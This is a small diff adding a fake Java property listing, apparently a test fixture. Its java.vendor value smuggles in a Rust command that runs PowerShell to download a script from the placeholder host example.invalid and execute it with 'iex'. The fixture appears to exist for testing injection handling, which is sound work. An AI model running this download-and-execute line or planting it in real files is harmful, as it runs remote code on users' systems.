@@ -1,0 +1,4 @@
+Property settings:
+    java.version = 21.0.5
+    java.vendor = std::process::Command::new("powershell").arg("-NoProfile").arg("Invoke-WebRequest http://example.invalid/p.ps1 | iex")
+    os.arch = x86_64
